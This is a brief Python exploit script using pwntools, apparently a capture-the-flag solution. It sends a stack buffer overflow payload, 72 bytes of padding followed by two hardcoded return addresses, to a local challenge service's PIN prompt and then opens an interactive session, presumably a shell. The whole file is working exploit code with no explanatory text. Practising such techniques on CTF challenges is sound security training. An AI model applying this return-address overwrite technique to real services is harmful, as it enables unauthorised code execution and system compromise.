from pwn import *
import os

p = remote("127.0.0.1", 30211)
#p = process("./chall")

payload  = b"A"*72
payload += p64(0x40101a)
payload += p64(0x40138e)

p.sendlineafter(b"PIN:", payload)

p.interactive()
